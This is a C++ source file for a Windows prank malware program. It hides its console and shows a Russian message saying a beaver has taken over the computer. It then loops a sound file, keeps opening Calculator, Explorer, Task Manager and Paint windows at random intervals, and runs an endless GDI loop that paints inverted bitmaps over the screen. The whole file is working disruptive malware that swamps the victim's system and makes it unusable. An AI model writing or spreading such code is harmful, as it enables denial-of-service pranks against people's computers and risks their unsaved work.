#include <iostream>
#include <Windows.h>
#include <ctime> // Include for time()

#pragma comment(lib, "winmm.lib")

VOID WINAPI programstart(VOID) {
    srand(static_cast<unsigned int>(time(NULL))); // Seed the random number generator
    while (1) {
        int randomnumber = rand() % 4; // Generate a random number between 0 and 3
        int randinterval = rand() % 1000; // Generate a random interval between 0 and 999 ms

        if (randomnumber == 0) {
            ShellExecute(0, 0, L"calc.exe", 0, 0, SW_SHOWNORMAL);
        } else if (randomnumber == 1) {
            ShellExecute(0, 0, L"explorer.exe", 0, 0, SW_SHOWNORMAL);
        } else if (randomnumber == 2) {
            ShellExecute(0, 0, L"taskmgr.exe", 0, 0, SW_SHOWNORMAL);
        } else if (randomnumber == 3) {
            ShellExecute(0, 0, L"mspaint.exe", 0, 0, SW_SHOWNORMAL);
        }

        Sleep(randinterval); // Sleep for the random interval
    }
} // Missing semicolon added here
VOID WINAPI gdi(VOID) {
    int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);

    HDC hdc = GetDC(0);

        while (1) {
            // Create a compatible DC and bitmap for the source
            HDC hdcSource = CreateCompatibleDC(hdc);
            HBITMAP hBitmap = CreateCompatibleBitmap(hdc, x, y);
            SelectObject(hdcSource, hBitmap);

            // Perform the BitBlt operation
            BitBlt(hdc, 0, 0, x - 10, y, hdcSource, 0, 0, NOTSRCERASE);

            
            // Clean up
            DeleteObject(hBitmap);
            DeleteDC(hdcSource);
        }
}VOID WINAPI music(VOID) {
    PlaySound(TEXT("music.wav"), NULL, SND_LOOP | SND_FILENAME);
}

int main() {
    FreeConsole();

    MessageBox(0, L"Бобр пороботил ваш комп!", L"Курва", MB_ICONINFORMATION | MB_OK);



    HANDLE musichandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)music, 0, 0, 0);

    Sleep(2500);

    

    HANDLE programhandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)programstart, 0, 0, 0);

   

    Sleep(5000);

    HANDLE gdihandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)gdi, 0, 0, 0);

    Sleep(INFINITE); // Use INFINITE instead of -1 for clarity
}